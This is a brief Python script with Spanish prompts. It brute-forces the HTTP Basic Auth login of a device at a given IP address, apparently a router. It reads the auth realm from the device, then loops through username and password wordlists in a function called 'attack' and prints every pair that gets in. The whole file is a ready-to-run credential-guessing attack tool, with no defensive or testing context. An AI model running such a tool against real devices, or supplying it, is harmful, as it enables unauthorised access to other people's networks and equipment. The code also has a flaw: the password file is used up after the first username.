import urllib.request as ur 
import http.client
import sys

def get_realm(ip):
    realm_router = ""
    try:
        conn = http.client.HTTPConnection(ip)
        conn.request("GET", "/")
        res = conn.getresponse()
        realm_router = res.getheader("WWW-Authenticate")
        realm_router = realm_router.split("=")[1].strip("\"")
        return realm_router
    except Exception as e:
        print(e)
        sys.exit(0)

def attack(ip, users, passwords):
    find = False
    realm_router = get_realm(ip)

    for u in users:
        u2 = u.strip()
        for p in passwords:
            p2 = p.strip()
            try:
                auth_handler = ur.HTTPBasicAuthHandler()
                auth_handler.add_password(realm=realm_router,
                                        uri=ip,
                                        user=u2,
                                        passwd=p2)
                opener = ur.build_opener(auth_handler)
                ur.install_opener(opener)
                pag = ur.urlopen("http://" + str(ip))
                if(pag.getcode() == 200):
                  print("[ usuario y contraseña correctos]: " + str(u2) + ":" + str(p2))
                  find = True                        
            except:
                print( str(u2) + ":"+  str(p2) + " >> usuario y contraseña incorrectos")
    if not find:
        print("usuario y contraseña no encontrados.")

#inicio del programa#
if __name__ == "__main__":
    ip = input("Introduce la IP: ")
    try:
        users = input("Archivo con los usuarios: ")
        users = open(users, "r")
        passwords = input("Archivos con las contraseñas: ")
        passwords = open(passwords, "r")
    except:
        print("imposible leer el fichero")
        sys.exit(0)
    attack(ip, users, passwords)
